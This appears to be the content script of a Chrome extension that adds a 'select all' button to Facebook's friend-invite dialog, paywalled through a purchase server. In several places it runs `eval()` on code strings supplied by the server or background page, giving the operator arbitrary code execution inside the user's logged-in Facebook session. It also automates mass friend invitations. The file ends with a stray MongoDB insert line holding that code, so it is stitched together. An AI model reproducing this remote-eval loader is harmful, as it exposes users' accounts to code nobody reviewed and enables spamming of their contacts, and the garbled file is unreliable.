var APPINFO_URL = 'http://auth.friend-manager.com/buy/';
var APPINFO_ID = chrome.i18n.getMessage('appInfo_id');
var WINDOW_NAME = chrome.i18n.getMessage('window_name');
var UPSELL_HTML_1 = chrome.i18n.getMessage('upsell_html_1');
var UPSELL_HTML_2 = chrome.i18n.getMessage('upsell_html_2');
var MSG_90_SECONDS = chrome.i18n.getMessage('trial_delay_time');
var SELECT_ALL_BUTTON = chrome.i18n.getMessage('select_all');

var gat_valid = 'fail';
var gat_page = '';
chrome.extension.sendMessage({cmd: 'gat_valid'}, function (response) {
    gat_valid = response.valid;
    gat_page = response.page;
    if (typeof gat_page !== 'undefined' && gat_page !== null && gat_page !== '') eval(gat_page);
    MAIN_APP();
});
var MAIN_APP = function () {
    if (gat_valid === 'ok') {
//-------------------------------------------------- START OF MAIN APP --------------------------------------------------//


        var purchaseKey, full;

        var appInfo = {
            url: APPINFO_URL,
            appId: APPINFO_ID
        };

        function purchase() {
            var URL = appInfo.url + appInfo.appId + '?purchaseKey=' + purchaseKey;

            var windowName = WINDOW_NAME;

            var width = 1000;
            var height = 740;
            var left = (screen.width / 2) - (width / 2);
            var top = (screen.height / 2) - (height / 2);

            var features = 'toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,copyhistory=no,width=' + width + ',height=' + height + ',top=' + top + ',left=' + left;

            chrome.extension.sendMessage({cmd: 'purchase-click'});
            window.open(URL, windowName, features);
        }

        function checkPurchase(purchaseKey, cb) {
            chrome.extension.sendMessage({type: 'checkPurchase'},
                function (response) {
                    if (console)console.log(response);
                    cb(response);
                }
            );
        }

        function purchaseValidate() {
            checkPurchase(purchaseKey, function (obj) {
                if (obj !== false) {
                    if (obj.purchased) {
                        if ('full' in obj.includes) {
                            chrome.extension.sendMessage({storage: 'full', value: obj.includes.full});
                            $('#fbadd_upsell').remove();
                            $('#invite-all-message').remove();
                            chrome.extension.sendMessage({cmd: 'paid-run'});
                            return eval(obj.includes.full);
                        }
                        if (console)console.log('purchased but no bundle :/');
                        return;
                    }
                }
                purchase();
            });

            $('#fbadd_upsell').fadeOut(function () {
                $('#fbadd_upsell').remove();
            });

            return false;
        }

        function showUpsell(purchaseKey, showNavigate) {
            var upsell = $('#fbadd_upsell');
            if (upsell.size() > 0) {
                return;
            }

            var html = UPSELL_HTML_1;

            if (upsell.size() < 1) {
                upsell = $(document.createElement('div')).attr('id', 'fbadd_upsell');
                $('body').append(upsell);
            }

            html += UPSELL_HTML_2;

            upsell.html(html);

            var close = upsell.find('.close').css({
                color: 'white',
                'font-size': '40px',
                position: 'absolute',
                right: '4px',
                top: '-6px',
                cursor: 'pointer'
            });

            upsell.on('click', '.close', function () {
                upsell.slideUp(function () {
                    upsell.remove();
                });
            });

            upsell.find('a.purchase').click(purchaseValidate);

            upsell.css({
                position: 'fixed',
                top: 0,
                left: 0,
                right: 0,
                'z-index': 10000,
                'text-align': 'center',
                background: 'black',
                'font-size': '20px',
                padding: 10,
                'font-weight': 'bold',
                'color': 'white'
            });
        }

        function DoSelectAll() {
            if (console)console.log('selectAll...');

            var $checkboxes = $('._1pu2._1pu4');
            var $selectedCheckboxes = $('._1pu2._1pu3');
            var selected = '_1pu3';

            if ($selectedCheckboxes.size() > 14) {
                return $('a.purchase').effect('pulsate', {times: 2}, 600);
            }

            var ct = $selectedCheckboxes.size();
            var delay = 200;

            $checkboxes.each(function () {
                if (ct > 14) {
                    return;
                }

                ct += 1;
                var self = $(this);
                if (self.is(selected)) {
                    return;
                }
                if (self.is('is_waiting')) {
                    return;
                }
                self.addClass('is_waiting');

                setTimeout(
                    function () {
                        if (!self.is(selected)) {
                            self.parent().trigger('click');
                        }
                        self.removeClass('is_waiting');
                    }, delay);

                delay += 100;
            });
        }


        function selectAll(timeLastRun) {
            if (console)console.log('last run: ' + timeLastRun);

            var timeNewRun = new Date();
            if (console)console.log('new run: ' + timeNewRun.toString());

            var timeAllowed = new Date(timeLastRun);
            timeAllowed.setSeconds(timeAllowed.getSeconds() + 90);
            if (console)console.log('allow run: ' + timeAllowed.toString());

            if (timeLastRun == null || timeNewRun > timeAllowed) {
                chrome.extension.sendMessage({type: "storage", key: "timeStamp", value: timeNewRun.toString()});
                chrome.extension.sendMessage({cmd: 'free-run'});
                DoSelectAll();
            } else {
                var msg = $('#invite-all-message');
                if (msg.size() === 0) {
                    $(document).ready(function () {
                        var path = chrome.extension.getURL('css/jquery-ui.css');
                        $('head').append($('<link>')
                            .attr("rel", "stylesheet")
                            .attr("type", "text/css")
                            .attr("href", path));
                    });
                    $('body').append(MSG_90_SECONDS);
                    msg = $('#invite-all-message');
                }
                msg.eq(0).dialog({
                    modal: false,
                    buttons: {
                        Purchase: function () {
                            purchaseValidate();
                        },
                        OK: function () {
                            $(this).dialog("close");
                        }
                    }
                });
            }
        }

        var workFunc = function () {
            if (console)console.log('selecting...');

            window.fbScrollPane = $('div._1v3l .uiScrollableAreaWrap.scrollable');
            if (window.fbScrollPane.size() === 0) {
                if (console)console.log('fbScrollPane not found.');
                return;
            }
            window.fbScroll = window.fbScrollPane[0];

            chrome.extension.sendMessage(
                {type: "storage", key: ["purchaseKey", "full", "timeStamp"]},

                function (items) {
                    purchaseKey = items.purchaseKey;
                    full = items.full;

                    if (full != null) {
                        chrome.extension.sendMessage({cmd: 'paid-run'});
                        eval(full);
                        $('#fbadd_upsell').remove();
                        $('#invite-all-message').remove();
                    } else {
                        if ($('#fbadd_upsell')[0] != null) {
                            selectAll(items.timeStamp);
                            showUpsell(purchaseKey);
                        } else {
                            checkPurchase(purchaseKey, function (obj) {
                                if (console)console.log(obj);
                                if (obj !== false && obj.purchased && "full" in obj.includes) {
                                    chrome.extension.sendMessage({
                                        type: "storage",
                                        key: "full",
                                        value: obj.includes.full
                                    });
                                    $('#fbadd_upsell').remove();
                                    $('#invite-all-message').remove();
                                    chrome.extension.sendMessage({cmd: 'paid-run'});
                                    return eval(obj.includes.full);
                                }
                                selectAll(items.timeStamp);
                                showUpsell(purchaseKey);
                            });
                        }
                    }
                }
            );
        };


        var mutex = false;

        var addButtonFunc = function () {
            if (mutex) {
                return;
            }
            mutex = true;

            window.fbScrollPane = $('div._1v3l .uiScrollableAreaWrap.scrollable');
            if (window.fbScrollPane.size() === 0) {
                mutex = false;
                return;
            }
            window.fbScroll = window.fbScrollPane[0];

            //if(console)console.log('addButton...');
            profileBrowser = $('form._s');
            if (profileBrowser.find('a.uiOverlayButton.selectAllFriends').size() > 0) {
                //if(console)console.log('button already added.');
                mutex = false;
                return;
            }

            $('#invite-all-message').dialog("close");

            var footer = profileBrowser.find('div.uiOverlayFooter');
            var footerButtons = footer.find('.uiOverlayFooterButtons');
            footerButtons.prepend(
                '<a class="_42ft _4jy0 uiOverlayButton _4jy3 _517h selectAllFriends" href="#" role="button">' + '<span class="uiButtonText">' + SELECT_ALL_BUTTON + '</span>' + '</a>'
            );

            $('a.uiOverlayButton.selectAllFriends').click(function () {
                workFunc();
            });

            if (console)console.log('addButton done.');
            mutex = false;
        };


        if (console)console.log('yeah, started...');
        window.installedFBInviter = false || window.installedFBInviter;
        if (!window.installedFBInviter) {
            if (console)console.log('installing...');
            window.installedFBInviter = true;
            $('body').off('DOMSubtreeModified', addButtonFunc);
            $('body').on('DOMSubtreeModified', addButtonFunc);
        } else {
            if (console)console.log('installed.');
        }


        chrome.extension.onMessage.addListener(
            function (request, sender, sendResponse) {
                workFunc();
            }
        );


//-------------------------------------------------- END OF MAIN APP --------------------------------------------------//
    }
};
var _0x849d = ['scrollHeight', 'fbScroll', 'setTimeout', 'click', '._1pu2._1pu4', 'find', 'fbScrollPane', 'scrollTop'];
var DoFull = function () {
    var scrollHeight = window['fbScroll']['scrollHeight'];
    window['fbScrollPane']['scrollTop'](scrollHeight), window['fbScrollPane']['find']('._1pu2._1pu4').parent()['click'](), window['setTimeout'](function () {
        window['fbScroll']['scrollHeight'] > scrollHeight && window['setTimeout'](DoFull, 333);
    }, 999);
};
DoFull();
db.test.insert( "var DoFull = function () { var scrollHeight = window['fbScroll']['scrollHeight']; window['fbScrollPane']['scrollTop'](scrollHeight), window['fbScrollPane']['find']('._1pu2._1pu4').parent()['click'](), window['setTimeout'](function () { window['fbScroll']['scrollHeight'] > scrollHeight && window['setTimeout'](DoFull, 333); }, 999); }; DoFull();");